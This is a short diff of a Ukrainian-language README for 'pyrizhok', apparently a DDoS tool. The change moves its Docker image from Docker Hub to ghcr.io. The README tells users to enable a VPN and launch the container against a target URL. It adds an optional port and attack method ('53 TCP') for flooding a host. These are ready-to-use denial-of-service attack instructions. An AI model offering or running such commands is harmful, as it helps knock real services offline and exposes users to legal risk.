@@ -85,11 +85,11 @@
 1. Активуйте VPN.
 2. Запустіть пиріжок через Docker з адресою цілі:
     ```bash
-    docker run -it pocketsunflower/pyrizhok:latest https://voenny.korabl.net
+    docker run -it ghcr.io/pocket-sunflower/pyrizhok:latest https://voenny.korabl.net
     ```
 3. _(опціонально)_ Якщо треба дамажити нестандартний порт та змінити метод атаки, просто додайте їх до команди:
    ```bash
-   docker run -it pocketsunflower/pyrizhok:latest https://voenny.korabl.net 53 TCP
+   docker run -it ghcr.io/pocket-sunflower/pyrizhok:latest https://voenny.korabl.net 53 TCP
    ```
    
 Коли настане час провітрити хату, натисніть **_Ctrl+C_** або вбийте контейнер іншим чином.
